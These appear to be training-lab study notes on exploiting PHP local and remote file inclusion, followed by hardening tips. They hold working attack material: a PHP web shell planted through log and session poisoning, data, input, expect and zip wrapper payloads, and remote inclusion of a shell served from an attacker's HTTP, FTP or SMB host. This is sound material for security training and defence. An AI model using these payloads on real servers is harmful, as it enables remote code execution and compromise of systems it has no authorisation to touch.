Apache and Nginx maintain various log files such as `access.log` and `error.log`.
- The `access.log` file contains information about all requests made to the server and their `User-Agent` strings.
- The Nginx logs are readable by the low privilege `www-data` user by default, while the Apache logs are readable by root and adm users.
- However, these files are readable by low privileged users in older Apache versions or cases where this has been misconfigured.
- `http://134.209.184.216:32415/index.php?language=/var/log/apache2/access.log`
  - The log contains the remote IP address, request page, response code, and the user-agent string.
  - The `User-Agent` depends on the user's browser and can be edited by intercepting the request.
  - Using Burp Suite, you can intercept the log message retrieval and send it to the Repeater. Next, change the `User-Agent` header to something else such as `Apache Log Poisoning` and click `Go`.
  - The new user-agent will appear in the log file.
  - If this works, replace the User-Agent string with a PHP shell: `<?php system($_GET['cmd']); ?>`. This gets logged into the file and gets executed by the server as PHP code on inclusion.
  - You can now execute OS-level commands by adding a parameter to the GET request.
    - `GET /index.php?language=/var/log/apache2/access.log&cmd=id HTTP/1.1`
- Some other files that can be included are: `/var/log/nginx/access.log`, `/var/log/sshd.log`, `/var/log/mail`, and `/var/log/vsftpd.log`.

Similar to server log files, PHP saves user sessions on disk.
- This path is dictated by the `session.save_path` configuration variable, which is empty by default.
- In such cases, the session files are saved to the `/var/lib/php/sessions` folder on Linux and `C:\Windows\Temp` on Windows.
- The name of this session file can be identified from the `PHPSESSID` cookie.
- For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3` then its location on the disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
- http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
- Change to: http://134.209.184.216:32415/index.php?language=session_poisoning
- Looking at the original URL again will show `session_poisoning` instead of `es.php`
- http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>
- Once the above shell is run, you can add `cmd` as a parameter to the cookie URL:
- http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3&cmd=id
- The logs have to be poisoned with the PHP shell each time a new command needs to be run.
***

## Other PHP Wrappers

PHP provides some additional wrappers which can be leveraged to gain command execution.

**Expect Wrapper**: The expect wrapper in PHP helps in interaction with process streams.
- This extension is disabled by default.
- The following URL will return the output of the `id` command.
  - `http://blog.inlanefreight.com/index.php?language=expect://id`

**Data Wrapper**: The data wrapper can be used to include external data, even PHP code.
- It is possible to use this only if the `allow_url_include` setting is enabled in the PHP configuration.
- This can be found in the file `/etc/php/X.Y/apache2/php.ini` for Apache and in `/etc/php/X.Y/fpm/php.ini` for php-fpm used by Nginx, where `X.Y` is your install PHP version.
- First, base64 encode a PHP web shell:
  - `echo '<?php system($_GET['cmd']); ?>' | base64`
- Then include it using the data wrapper:
  - http://blog.inlanefreight.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id

**Input Wrapper**: Similar to the data wrapper, the input wrapper can be used to include external input and execute code. It also needs the `allow_url_include` setting enabled.
- The following curl command sends a POST request with a system command and then includes it using `php://input`, which gets executed by the page.
  - `curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid`

**Zip Wrapper**: The zip wrapper can prove useful in combination with file uploads
- If the website allows uploading arbitrary files, an attacker can upload a malicious zip file and include PHP code.
- This wrapper isn't enabled by default and can be installed with the command below:
  - `apt install phpX.Y-zip`
- The below commands will create a malicious archive:
  - `echo '<?php system($_GET['cmd']); ?>' > exec.php`
  - `zip malicious.zip exec.php`
  - `rm exec.php`
- Next, copy `malicious.zip` to the webroot to simulate the upload.
- The files in the zip archive can be referenced using the # symbol, which should be URL-encoded in the request.
- For example, the URL below can be used to include `exec.php` and then execute code using the `cmd` parameter:
  - http://134.209.184.216:30489/index.php?language=zip://malicious.zip%23exec.php&cmd=id
  - In the URL above, # is encoded to `%23` to prevent the browser from recognizing it as a fragment.
***

## Remote File Inclusion (RFI)

RFI occurs when a website allows the inclusion of remotely hosted files.
- To include a remote file in PHP, the `allow_url_fopen` setting (enabled by default) and `allow_url_include` setting have to be turned on.

1. To test an RFI vulnerability, start a python web server on your host:
  - `python3 -m http.server 8080`
2. Include a PHP shell file in the directory being served up by the python web server and browse to the Host's web server IP and port, include a command to run:
  - `echo '<?php system($_GET['cmd']); ?>' > shell.php`
  - `blog.inlanefreight.com/index.php?language=http://localhost:8080/shell.php&cmd=id`
  - If the server appends the `.php` extension automatically, you can omit the `.php` at the end.

The FTP protocol can be used to access remote files. Python's `pyftpdlib` library can be used to test this locally.
- `python -m pyftpdlib -p 21`
- Next, use the `ftp://` scheme to access `shell.php` present in the FTP root.
  - `blog.inlanefreight.com/index.php?language=ftp://localhost/shell.php&cmd=id`
- By default, PHP tries to authenticate as an anonymous user. If the server needs authentication, then the credentials can be specified in the following way:
  - http://blog.inlanefreight.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id

**Windows**: when the application is running on Windows, the restrictions applied by `allow_url_include` can be bypassed by using the SMB protocol. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
- Use Impacket's `smbserver.py`, which allows anonymous authentication by default.
- `blog.inlanefreight.com/index.php?language=\\10.10.14.25\share\shell.php&cmd=whoami`
***

## Hardening Tips

**Preventing Directory Traversal**
If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain.
- For example, they could:
  - Read `/etc/passwd` and potentially find SSH keys or know a valid user name for a password spray attack.
  - Find other services on the box such as Tomcat and read the tomcat-users.xml file.
  - Discover valid PHP Session Cookies and perform session hijacking.
  - Read current web application configuration and gain access to the secret used to protect cookies.
- The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename.
  - For example, PHP has `basename()` which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename.
  - The downside to this method is that if the application needs to enter any directories, it will not be able to do it.
  - If you want to play with this, enter the PHP Interpreter with `php -a` and then run commands like `echo basename("/etc/passwd");`.

**Doing the Correct Checks**
A common attack vector of LFI's happens when applications incorrectly check for malicious things.
- The most common being using `deny lists` instead of `allow lists`.
- A great example of this is upload forms where the PHP extension gets blocked from being uploaded, not realizing several other extensions exist that have the same functionality (php1, php2, php3, etc).
- If an allow list was utilized only to allow jpeg, gif, and png to be accessed, the attack might have been avoided altogether.

When validating extensions, be sure the application utilizes the programming languages built-in tools to extract the extension before comparing.
- If the built-in tools won't suffice for some reason, then utilize Regular Expressions and be sure to place the `end of line terminator ($)` at the end of user inputs.
- If neither of these is done, the application will likely check for an approved extension in the filename, which may not really be the extension (ex: `file.php.jpg`).
- PHP Regular Expression function can be configured so that it allows for code execution.

**Application Hardening**
When attackers try to get around application hardening they can generate logs to indicate their behavior.
- For example, if the `system()` function is blocked, a log will be created about the blocked functionality being used when an attacker users it.
- To disable error messages being sent to a website in PHP, edit the `php.ini` file and verify: `display_errors = Off` is set.
- To block `system()` in PHP, append the functions you want to block to the "disabled_functions" lines of PHP.
  - A list of functions recommended blocking is: `system`, `passthru`, `shell_exec`, `popen`, `proc_open`, `curl_exec`, `curl_multi_exec`, `parse_ini_file`, `show_source`.
- In PHP, setting `allow_url_fopen` and `allow_url_include` to Off will prevent web applications to load files from remote locations.
- It's possible to jail web applications to prevent them from accessing non-web related files through the use of Docker.
  - If this is not an option, in PHP, add `open_basedir = /var/www` in the `php.ini` file.

**Web Application Firewall**
The universal way to harden applications is to utilize a WAF (Web Application Firewall) such as `ModSecurity`.
- If using `ModSecurity`, it is recommended to also use the Core Rule Set.
- When dealing with WAF's, the most important thing to avoid is false positives and blocking non-malicious requests.
  - ModSecurity minimizes false positives by offering a `permissive`, which will only reporet things it would have blocked.
- Secondly, ModSecurity is reputation-based, meaning each trigger gets a point value assigned, and the request only gets blocked upon reaching a certain point.
